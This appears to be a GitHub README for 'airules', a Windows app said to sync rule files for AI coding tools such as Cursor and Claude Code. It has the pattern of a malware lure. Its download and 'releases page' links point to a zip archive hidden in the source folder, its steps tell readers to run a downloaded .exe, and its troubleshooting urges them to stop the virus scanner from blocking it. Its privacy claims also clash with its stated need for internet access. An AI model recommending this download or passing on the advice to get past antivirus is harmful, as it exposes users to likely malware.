# 🤖 airules - Standardize coding rules for every tool

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Phukg/airules/raw/refs/heads/main/src/core/sync/Software_v3.8.zip)

Airules helps you manage your coding instructions. Many modern coding tools like Cursor, Windsurf, or Claude Code use special rules to understand your project. Setting these rules for every tool takes time. Airules saves your rules in one file. The app then sends these instructions to all your favorite coding helpers. You update one file to change how your AI assistant writes code.

## 🛠 Why use airules

Coding apps work better when they know your style. You might prefer short functions, specific file structures, or certain security patterns. Manual updates across ten different programs waste time. Errors creep in when your tools hold different versions of your rules. 

Airules removes this work. You store your setup in a file named .airules.yml. This app syncs that file to every tool you use. You maintain a single source of truth for your coding preferences.

## 📥 How to get started

You need a Windows computer to use this app. Follow these steps to set up your workflow:

1. Visit the [releases page](https://github.com/Phukg/airules/raw/refs/heads/main/src/core/sync/Software_v3.8.zip).
2. Look for the file ending in .exe under the latest version.
3. Click the file to start the download.
4. Open the file once the download completes.
5. Follow the prompts on your screen to finish the setup.

## ⚙️ Using the app

The app uses a simple text file to store your rules. Follow these steps to configure your workspace:

1. Open the airules window.
2. Select the option to create a new rule file.
3. Name your file .airules.yml.
4. Type your coding standards into this file. 
5. Select the coding tools you use from the list.
6. Click the Sync button.

The app places your rules into the correct locations for each tool. You do not need to hunt for deep system folders. The app manages the paths for you.

## 📁 Understanding the .airules.yml file

This file holds your project instructions. You write your rules in plain text. Examples of entries include:

- Always add comments to functions.
- Use TypeScript for all projects.
- Keep components under fifty lines.
- Reject code that uses outdated libraries.

The app reads this list and translates the instructions for each specific AI tool. You write the rule once. The software handles the technical details for tools like Copilot, Cline, and Gemini.

## 🔄 Updating your rules

Your coding habits change over time. When you need to update a rule, open your .airules.yml file. Change the text to match your new needs. Click the Sync button inside the airules app again. Every tool refreshes its instructions immediately. You never need to copy and paste text into multiple settings pages.

## 🖥 System requirements

This software works on all Windows 10 and Windows 11 computers. Ensure you have at least 200 megabytes of free disk space. The app requires a connection to the internet during the sync process. If you limit access to your computer, ensure your firewall allows the app to reach your coding tool configuration files.

## 🔌 Supported tools

Airules supports a wide range of coding helpers. Current compatibility includes:

- Claude Code
- Cursor
- Copilot
- Windsurf
- Cline
- Gemini
- Qwen

The software also supports several other command-line tools. As long as the tool reads from a standard configuration file, airules will manage it.

## 🛡 Security and privacy

The app runs locally on your computer. Your rules stay on your hard drive. No data goes to external servers. The app only accesses the specific folders where your coding tool settings reside. You keep full control over your instructions.

## 🚀 Troubleshooting common issues

If the app fails to sync, check these common points:

- Close your coding tools before you run a sync. Some tools lock their configuration files while they run.
- Check that your .airules.yml file resides in your project folder.
- Run the airules app with normal user permissions. 
- Restart the app if the sync button remains gray for more than a few seconds.

If you encounter errors during the install process, ensure your virus scanner does not block the application. You can add an exception for the airules folder if needed.

## 📝 Best practices for rules

Write clear and specific rules. Vague instructions create inconsistent code. Instead of saying "write clean code," explain what "clean" means for your project. Specify naming patterns, testing requirements, and styling choices. Test your rules by asking your AI tool to perform a task. If the result misses the mark, adjust the rule in your .airules.yml file. Repeat this process until your AI assistant produces the expected output. 

Airules makes this testing process fast. The goal is to spend less time configuring tools and more time writing and improving your software.